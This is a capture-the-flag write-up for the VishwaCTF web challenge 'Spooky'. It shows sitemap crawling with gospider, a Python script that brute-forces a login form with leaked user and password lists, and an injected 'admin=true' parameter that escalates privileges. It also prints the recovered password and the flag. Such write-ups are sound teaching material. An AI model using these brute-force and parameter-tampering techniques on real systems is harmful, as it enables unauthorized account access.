# **Writeup - VishwaCTF**

* Category **WEB** <!-- challenge category -->
* Name **Spooky** <!-- challenge name -->
* Difficulty **Medium**

## Description
The challenge show us a site, and the description report that a user forgot his login credentials. The scope of the challenge was to recover the forgotten credentials.

## **Solution**
Firstly looking at the web interface there weren't clues about what to do. So to retrieve more information there were two possibilities:
* Use dirb to see if there are some useful folders to retrieve information.
* Use gospider in order to try to retrieve sitemap.xml or robots.txt 
</li>
So trying the second way by executing the command:
```shell
gospider -s https://ch39763117927.ch.eng.run/ --sitemap
```
from the sitemap.xml file we discover there are two interesting files inside creds folder, namely pass.txt and user.txt, containing list of user and password of the site. At this point in order to login we bruteforce for every user in users.txt all passwords in pass.txt. It is possible to do this from script using following code
```Python
import requests  
  
url = "https://ch39763117934.ch.eng.run/"  
user_res = requests.get(f"{url}/creds/users.txt")  
users = user_res.text.strip(' \n').split('\n')  
password_res = requests.get(f"{url}/creds/pass.txt")  
passwords = password_res.text.strip(' \n').split('\n')  
correct = tuple()  
  
for user in users:  
	for password in passwords:  
		res = requests.post(f"{url}/login.php", data={"user": user, "pass": password})  
		# log print  
		print(user, password)  
		if "Incorrect" not in res.text:  
			print(res.text)  
			correct = (user, password)  
			break  
	if "Incorrect" not in res.text:  
		break
```
At this point we are logged as user shrekop, with password "VmU5gnXKYN2vLp48", but there's no flag on the page. After thinking about it, the first idea was insert an additional param ```admin='true'``` in the form in order maybe to become admin with the code lines:
```Python
res = requests.post("https://ch39763117927.ch.eng.run/login.php", data={"user": correct[0], "pass": correct[1], 'admin': 'true'})  
print(res.text)
```
This worked as the response was:
```html
<b>Logged in as </b> shrekop (admin)<script>alert('Congratulations. You got the flag!');</script><script>alert('VishwaCTF{h1dd3n_P@raMs}');</script>
```
